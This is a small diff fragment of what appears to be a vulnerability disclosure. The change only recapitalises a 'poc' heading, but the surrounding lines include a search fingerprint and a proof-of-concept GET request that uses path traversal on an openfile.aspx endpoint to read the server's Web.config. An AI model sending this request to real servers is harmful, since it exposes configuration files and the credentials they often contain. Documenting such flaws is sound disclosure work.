@@ -8,7 +8,7 @@
 body="b28web/Utility/"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
